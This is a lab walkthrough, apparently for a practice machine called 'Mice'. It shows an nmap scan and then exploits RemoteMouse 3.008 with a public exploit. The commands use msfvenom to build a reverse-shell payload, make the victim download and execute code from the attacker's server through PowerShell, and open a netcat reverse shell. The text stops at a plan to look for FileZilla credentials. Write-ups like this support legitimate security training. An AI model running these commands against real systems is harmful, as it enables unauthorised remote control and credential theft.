# Report - Mice

# Executive Summary

# Recommendations

# Resources
- https://github.com/p0dalirius/RemoteMouse-3.008-Exploit
# Recon

We edit `/etc/hosts` and run `nmap -sV -sC -T4 -oA initial mice`.

```
???(kali?kali)-[~]
??$ nmap -sV -sC -T4 -oA initial mice
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 18:38 +0000
Nmap scan report for mice (192.168.62.199)
Host is up (0.00083s latency).
rDNS record for 192.168.62.199: MICE
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Remote-PC
| Not valid before: 2025-12-02T17:03:21
|_Not valid after:  2026-06-03T17:03:21
| rdp-ntlm-info: 
|   Target_Name: REMOTE-PC
|   NetBIOS_Domain_Name: REMOTE-PC
|   NetBIOS_Computer_Name: REMOTE-PC
|   DNS_Domain_Name: Remote-PC
|   DNS_Computer_Name: Remote-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2026-04-13T18:38:45+00:00
|_ssl-date: 2026-04-13T18:38:50+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.34 seconds
```
# Non-root access

The lab intro mentions `RemoteMouse 3.008`, so we search exploit-db for it.

https://github.com/p0dalirius/RemoteMouse-3.008-Exploit

We find a public exploit on GitHub.

```sh
git clone https://github.com/p0dalirius/RemoteMouse-3.008-Exploit
cd RemoteMouse-3.008-Exploit

python RemoteMouse-3.008-Exploit.py
# usage: RemoteMouse-3.008-Exploit.py [-h] -t TARGET_IP [-v] [-d DELAY] -c CMD
# RemoteMouse-3.008-Exploit.py: error: the following arguments are required: -t/--target-ip, -c/--cmd

# get our attacker IP
ip a | grep 192 #192.168.49.62

# generate a payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.62 LPORT=4444 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1

# host our malicious file, 'shell.ps1'
python3 -m http.server 8080

# start a listener...
sudo apt install rlwrap
rlwrap nc -lvnp 4444

# have victim download and execute reverse shell
python RemoteMouse-3.008-Exploit.py -t 192.168.62.199 -c 'powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString("http://192.168.49.62:8080/shell.ps1")"'

```

This fails, so let's try `nc.exe` binary instead.

```bash
cp /usr/share/windows-resources/binaries/nc.exe ./

python ./RemoteMouse-3.008-Exploit.py --target-ip 192.168.62.199 -v --cmd 'powershell -c "curl http://192.168.49.62/nc.exe -o C:/Windows/Temp/nc.exe"'
```

We got the victim to download `nc.exe`. We kill the python web server to re-use port 80.

![](Pasted%20image%2020260413135243.png)

```sh

# start a listener on port 80...slip through firewall
sudo apt install rlwrap
rlwrap nc -lvnp 80

python ./RemoteMouse-3.008-Exploit.py --target-ip 192.168.62.199 -v --cmd 'powershell -c "C:/Windows/Temp/nc.exe 192.168.49.62 80 -e cmd"'
```

And we get reverse shell.

![](Pasted%20image%2020260413135429.png)

# Root access

Now to search for FileZilla credentials.

